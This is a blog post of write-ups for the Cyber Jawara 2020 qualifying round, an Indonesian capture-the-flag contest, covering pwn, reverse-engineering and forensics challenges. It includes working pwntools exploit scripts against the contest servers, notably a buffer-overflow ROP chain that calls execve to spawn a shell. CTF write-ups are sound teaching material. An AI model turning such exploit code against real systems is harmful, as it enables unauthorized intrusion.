---           
layout: post
title:  "Cyber Jawara 2020 Quals "
date:   2020-09-18 
categories: ctf
description: Writeup Cyber Jawara 2020 Quals 
tags: ctf-writeup              
---

<iframe width="560" height="315" src="https://www.youtube.com/embed/lpi9Kmkf_Es" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

cyber jawara is a hacking competition on a national scale from Indonesia, 
in this article, I will explain some challenge that I solved during the competition 

# Syscall | Pwn

### Description

Syscall adalah salah satu pondasi yang penting dalam sistem operasi. Oleh karena itu, mengetahui tentang syscall adalah wajib dalam melakukan riset binary exploitation ataupun riset keamanan sistem operasi.

Berikut adalah layanan yang akan menjalankan syscall pada sistem Linux x86 64 bit.

nc pwn.cyber.jawara.systems 13371

### Solution

we were given a service that we have to input a syscall number and 5 arguments, 
since the program leak the flag address, so we can just using write syscall to print the flag.


{% highlight python %}
from pwn import *

r = remote("pwn.cyber.jawara.systems",13371)
r.recvuntil('Alamat memori flag: ')
flag = int(r.recv().split()[0].replace("\n","\x00"),16)
log.info("flag : " + str(flag))
r.sendline("1")
r.sendlineafter(":","1")
r.sendlineafter(":",str(flag))
r.sendlineafter(":","100")
r.sendline("x")
r.interactive()

{% endhighlight %}

<img src="/images/cj2020/syscall.png"/>


FLAG: CJ2020{penting_loh_orang_security_tau_syscall}

# ROP | Pwn

### Description

Return Oriented Programming (ROP) adalah salah satu trik yang biasa digunakan untuk mengeksekusi kode ketika instruction pointer sudah dapat dikontrol namun memasukkan/mengeksekusi shellcode tidak memungkinkan. Ide dasar ROP adalah menggunakan potongan-potongan instruksi mesin pada binary ataupun library yang mengandung ret (return) atau call (termasuk syscall) yang biasa disebut dengan ROP gadgets. Gadgets tersebut disusun sedemikian rupa sehingga instruksi bisa lompat-lompat dan pada akhirnya mengeksekusi perintah yang kita inginkan.

Berikut adalah layanan yang memilik celah buffer overflow tanpa proteksi canary (stack protector) sehingga Anda dapat meng-overwrite instruction pointer mulai dari bytes ke-17 input. Binary ini di-compile secara statically-linked, tetapi Anda tidak punya akses ke binary-nya. Yang Anda dapatkan hanya informasi mengenai binary ELF tersebut dan juga kumpulan alamat gadgets yang bisa Anda gunakan.

nc pwn.cyber.jawara.systems 13372

### Solution

another service only challenges, in this challenge we were given 2 files one is binary information 
and a file that contains a lot of gadget address. since we can control the instruction pointer and 
we already know that the binary has buffer overflow vulnerability, we can create an ROP chain to 
call execve() and spawn a shell. we can use gadget `mov qword ptr [rdx], rax ; ret` to store string 
`/bin/sh` inside bss segment. this is my exploit for this challenge.

{% highlight python %}
from pwn import *

r = remote("pwn.cyber.jawara.systems",13372)

context(arch="amd64",os="linux")

pop_rdx = 0x00000000004497c5
pop_rdi = 0x0000000000400696
pop_rax = 0x00000000004155a4
pop_rsi = 0x0000000000410183
pop_r10 = 0x000000000044bd35
add_rax_1 = 0x0000000000474820

xor_rax_rax = 0x0000000000444b00
syscall = 0x000000000047b52f
mov_rdx_rax = 0x00000000004182d7

buf = 0x0000000006bb2e0 + 100
ret = 0x0000000000400416

main = 0x000000000400b5d
p = "A" * 16

p += p64(pop_rax)
p += "/bin/sh\x00"
p += p64(pop_rdx)
p += p64(buf)
p += p64(mov_rdx_rax)
p += p64(pop_rax)
p += p64(59)
p += p64(pop_rdi)
p += p64(buf)
p += p64(pop_rsi)
p += p64(0)
p += p64(pop_rdx)
p += p64(0)
p += p64(syscall)

r.sendlineafter(":",p)
r.interactive()
{% endhighlight  %}

<img src="/images/cj2020/rop.png" />

FLAG: CJ2020{belajar_bikin_ropchain_sendiri_dong}

# RANJAU | Pwn

### Description

Mari bermain permainan yang sulit! Diberikan petak 4x4. Di setiap giliran, 
Anda harus memilih satu petak yang aman dari ranjau. Tentunya posisi ranjau selalu 
diacak layaknya game minesweeper. Flag akan ditampilkan ketika Anda berhasil bertahan 
hingga 8 giliran.

nc pwn.cyber.jawara.systems 13373

### Solution

unfortunately, I didn't solve this challenge during the competition due to some reason. 
in this challenge, we have to choose the right position and avoid the mine for 8 times. 

<img src="/images/cj2020/pseudo-ranjau.png" />

after we solve 8 times, we can get the flag from the `win()` function. to solve this 
challenge I made a simple script to find the right input.

{% highlight python %}
#!/usr/bin/env python2
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/CyberJawara-2020/quals/pwn/ranjau/ranjau")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    #attach(r)
    # B: E - L stack smash
    # C: A - I stack smash
    # for i in range(2):
    # safe : '}
    for o in range(0x1c,0xff):
        for i in range(0xff):
            # r = remote("pwn.cyber.jawara.systems", 13373)
            r = process([TARGET,])
            r.sendlineafter("):",chr(o) + chr(i))
            print("char : " + chr(o) + chr(i))
            r.recv()
            info = r.recv()
            print "res:" + str(info.split())
            if "FLAGGGGGGGGGGGGGGGGGGG" in info or "Selama" in info:
                print "AAAHAHAAHAHAHAH"
                raw_input()
            # r.sendline("D4")
            # r.sendline("C2")
            # r.sendline("D2")
            # r.interactive()
            r.close()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("pwn.cyber.jawara.systems", 13373)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)


{% endhighlight %}

after we found the right input `'}` we can input that string 8 times to get the flag

{% highlight python %}
from pwn import *
r = remote("pwn.cyber.jawara.systems", 13373)
for i in range(8):
    r.sendlineafter("):","'}")
    log.info("sent")
r.interactive()

{% endhighlight %}

<img src="/images/cj2020/ranjau.png" />

FLAG: CJ2020{hacker_beneran_nge-cheat_pakai_exploit_sendiri}

# BabyBaby | Reverse Engineering

### Description

Binary ini dapat digunakan untuk permulaan belajar reverse engineering.

Tips: Soal ini lebih mudah dikerjakan dengan static analysis seperti menggunakan Ghidra (gratis) atau IDA Pro (berbayar) dengan meng-generate kode C-like dari kode mesin yang ada di dalam binary.

### Solution

we were given a binary, here is the pseudocode of that binary 

<img src="/images/cj2020/pseudocode-babybaby.png" />

as you can see, we have to find the correct number for the v4 v3 v6 variable. to find the correct number I use z3 

{% highlight python %}
from z3 import *

#  (v4 + v5 != v4 * v6 || v5 / v6 != 20 || v5 / v4 != 3 )
v4 = Int("v4")
v5 = Int("v5")
v6 = Int("v6")
s = Solver()
s.add(v5 + v4 == v4 * v6)
s.add(v5 / v6 == 20)
s.add(v5 / v4 == 3)
s.add(v4 != 1)
s.add(v4 > 0)
s.add(v5 != 1)
s.add(v5 > 0)
s.add(v6 != 1)
s.add(v6 > 0)
print s.check()
print s.model()
{% endhighlight %}

run the program and we got the correct number

<img src="/images/cj2020/correct-baby.png" />

now, let's input the correct number to the binary

<img src="/images/cj2020/babybabyflag.png"/>

FLAG: CJ2020{b4A4a4BBbb7yy}

# Holmes Code | Reverse Engineering

### Description

This Code Secret Dr. Watson to Holmes, Please check message on the Code

### Solution

in these challenges, we were given a bunch of binary. 288 in total, 
every binary typically does the same thing. but if we look closely

<img src="/images/cj2020/asm-code0.png" />


as you can see on address `0x6000c9` and `0x6000cc` has a different value 
for every binary, to solve this challenge we can grab the value on 
`0x06000cc  cmp     dl, 0xec`and subtract with `0x1e`, and so on. 
we can just follow the asm instruction for other binary. here is my solver code
to solve this challenge

{% highlight python %}

from pwn import *
import subprocess
# elf = ELF("./a.out")
# for i, j in elf.symbols.iteritems():
files = [str("code/code"+str(x)) for x in range(0,288)]
dump = open("dump","w+")
flag = ''
for i in files:
    x = subprocess.Popen(["objdump","-d","-M","intel","%s" % i], stdout=PIPE).communicate()[0]
    tmp = (x[560+13:639].replace("]","").replace("\t","").replace("dl,","").split("\n"))
    # dump.write(tmp)
    op = tmp[0]
    cmp = tmp[1][len("    6000cc:80 fa b6          "):]
    print "================="
    print "file    : ", i
    print "Operate : ",op
    print "Cmp     : ",cmp
    if "xor" in op or "or" in op:
        flag += chr(int(op.replace("xor","").replace("or",""),16) ^ int(cmp.replace("cmp",""),16))
    elif "add" in op or "dd" in op:
        flag += chr((int(cmp.replace("cmp",""),16) - int(op.replace("add","").replace("dd",""),16)))
    elif "sub" in op or "ub" in op:
        flag += chr((int(cmp.replace("cmp",""),16) + int(op.replace("sub","").replace("ub",""),16)) % 256)


print flag

# print files
# from z3 import *



{% endhighlight %}

run and we got the flag

<img src="/images/cj2020/holmesflag.png"/>

FLAG: CJ2020{A_ScaNdal_in_B0h3mia}

# Home Sherlock | Reverse Engineering

### Description

Number Home Sherlock Holmes ? Please check on the File Download home : https://drive.google.com/file/d/14P7xZ4XIsEm6HU5WMvOVw6E0BFRH6CuH/view

### Solution

we were given a compiled golang binary. this is a simple challenge, we solve it by 
doing static analysis on main function.

<img src="/images/cj2020/pseudosherlock.png" />

as you can see, we can use `44400444004440044` as our input

<img src="/images/cj2020/sherlockflag.png" />

after we input the correct number, we got a string that encoded with base64, just decode the base64
and we got the flag

<img src="/images/cj2020/sherlockflag.png"/>

FLAG: CJ2020{221B_Baker_Str33t}

# FTP | Forensic

### Description

Potongan paket jaringan berikut berisi beberapa paket data yang terdiri dari berbagai 
komunikasi protokol, termasuk FTP. Sepertinya ada hal menarik yang bisa Anda ketahui dari situ.

### Solution

we were given a `.pcap` file, that contains some FTP communication. this is an easy challenge, 
to solve this challenge we have to collect all the data from the `FTP-DATA` protocol

<img src="/images/cj2020/ftp-data.png"/>

as you can see there is a format flag `C` in a0, to get the flag we have to collect 
all the data and then order the data by its info

{% highlight python %}

a0  = "C"
a1  = "J"
a10 = ''
a11 = "u"
a12 = "s"
a13 = "e"
a14 = "_"
a15 = "t"
a16 = "l"
a17 = "s"
a18 = "_"
a19 = "k"
a2  = "2"
a20 = "t"
a21 = "h"
a22 = "x"
a23 = "x"
a24 = "}"
a3  = "0"
a4  = "2"
a9  = "z"
a7  = "p"
a8  = "l"
a6  = "{"
a5  = "0"

print a0 +a1 + a2 + a3 + a4 + a5+ a6 + a7 + a8 + a9 + a10 + a11 + a12 + a13 + a14 + a15 + a16 + a17 + a18+ a19 + a20 + a21 + a22 + a23 + a24

{% endhighlight %}

run and we got the flag

<img src="/images/cj2020/ftpflag.png"/>

FLAG: CJ2020{plzuse_tls_kthxx}

# Image PIX | Forensic

### Description

Secret Message From Jim Moriarty to Holmes in Image

### Solution

this is also a simple challenge, in order to get the flag we have to extract the RGBA value from this image

{% highlight python %}

from PIL import Image
im = Image.open("./pix.png")
pix_val = list(im.getdata())
pix_val_flat = []

for group in pix_val:
    if type(group) == int:
        group (group, group, group, 0) # if int, change it to tupel
    for item in group:
        pix_val_flat.append(item)

for i in pix_val_flat:
    print chr(i),

{% endhighlight %}

run and we got the flag

<img src="/images/cj2020/imagepixflag.png" />

FLAG: CJ2020{A_Study_in_Scarlet}